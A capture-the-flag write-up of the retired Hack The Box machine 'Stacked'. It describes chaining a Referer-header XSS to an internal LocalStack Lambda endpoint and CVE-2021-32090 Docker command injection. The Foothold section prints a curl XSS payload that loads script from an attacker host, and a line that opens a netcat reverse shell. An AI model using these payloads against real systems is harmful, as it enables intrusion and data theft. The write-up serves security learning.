# Stacked

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Insane |
| **IP Address** | 10.10.11.112 |
| **Status** | Retired |

## Overview
Stacked is an insane-difficulty Linux machine that revolves around **LocalStack**, a local AWS-service emulator, and its associated Docker/Lambda tooling. A stored/reflected XSS vulnerability in a portfolio site's contact form is used to pivot an internal mail-reading admin user toward an internally exposed LocalStack web UI, from which a known LocalStack CVE grants an interactive shell inside the LocalStack container. A Docker/Lambda command-injection vulnerability is then used to escape the container context and progress toward full root compromise.

## Reconnaissance
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp   open  http    Apache httpd 2.4.41 (Ubuntu) - "STACKED.HTB"
2376/tcp open  ssl/docker? (TLS cert CN=0.0.0.0, SANs: localhost, stacked, 127.0.0.1, 172.17.0.1)
```
Virtual host discovery found `portfolio.stacked.htb`, a personal/agency portfolio site with a contact form.

## Enumeration
- `portfolio.stacked.htb` exposed `functions.php`, `process.php`, and `landing.php`, plus a `/files/docker-compose.yml` file (kept under `files/docker-compose.yml`) that documented the backend stack: a `localstack/localstack-full:0.12.6` container bound to `127.0.0.1:4566`/`4571`/`8080`, running the `serverless` service group with `DOCKER_HOST=unix:///var/run/docker.sock` mounted in: i.e. LocalStack has direct access to the host's Docker socket.
- The site's "About" copy referenced "implementations to enhance the mock AWS local environment," confirming LocalStack was actively used by the target application, not just a leftover artifact.
- The contact form's `process.php` endpoint returned a valid JSON response when queried directly, but rendered a different (broken) message in the browser: indicating the front-end JS handling of the response, and by extension the `Referer`/other reflected headers, was worth testing for XSS.
- LocalStack 0.12.6 is known to be vulnerable to several issues (documented in the referenced Sonar research), including unauthenticated access to internal Lambda/serverless APIs and command injection during Lambda container creation.

## Foothold
An XSS payload was placed in the `Referer` header of a request to `process.php`, since it appeared to be reflected without sanitization into an internally-viewed admin/mail context:
```
curl -X POST "http://portfolio.stacked.htb/process.php" \
  -H 'Referer: <script src="http://<attacker_ip>/cmon.js"></script>' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  --data 'fullname=Jeffrey+Keen&email=jeffrey%40nicerdicer.gov&tel=12345678901&subject=123'
```
The delivered script (`cmon.js`, kept under `files/`) made a synchronous background request against an internal LocalStack Lambda invocation endpoint to trigger a reverse shell payload:
```js
var url = 'http://127.0.0.1:8080/lambda/&nc <attacker_ip> 1337 -e bash/code'; // URL-encoded
```
A second payload, `read.js` (kept under `files/`), was used earlier in the chain to make the victim's browser fetch an internal webmail message (`http://mail.stacked.htb/read-mail.php?id=2`) and exfiltrate its contents to an attacker-controlled listener, which is how the LocalStack/S3-testing internal hostnames (`jtaint@stacked.htb`, `s3-testing.stacked.htb`) were first discovered. Triggering the Lambda endpoint via the XSS chain resulted in code execution inside the LocalStack container, and a reverse shell was received.

## Privilege Escalation
Inside the LocalStack container, the Docker socket mounted from the host (per the `docker-compose.yml` configuration) was reachable. LocalStack's Lambda implementation is documented (CVE-2021-32090) to invoke `docker create`/`docker run` with attacker-influenced parameters when a Lambda function is created, and command injection in that Docker invocation was leveraged to obtain a shell with far greater privileges: effectively pivoting from "inside the emulator container" to command execution against the underlying Docker host, and finally to full root access on the target machine.

## Lessons Learned
- Development/testing tools like LocalStack should never be exposed with the Docker socket mounted in, since RCE inside the emulator is equivalent to RCE against the host's Docker daemon.
- XSS in a "harmless" public-facing contact form can be devastating when it is viewed by an internal user with access to otherwise unreachable internal services (SSRF-by-proxy through a victim's browser).
- Command injection during container/image creation (`docker create`/`docker run` argument injection) is a recurring vulnerability class in tools that programmatically wrap the Docker CLI.

## Tools & References
- `cmon.js`, `read.js`: custom JavaScript payloads used for the blind XSS chain (internal mail read + LocalStack Lambda trigger); kept under `files/`.
- `files/docker-compose.yml`: recovered LocalStack service definition, documenting the vulnerable `0.12.6` image and Docker socket mount.
- CVE-2021-32090: LocalStack Lambda/Docker command injection
- Reference: Sonar Source blog, "Hack the Stack with LocalStack" (`https://blog.sonarsource.com/hack-the-stack-with-localstack`)
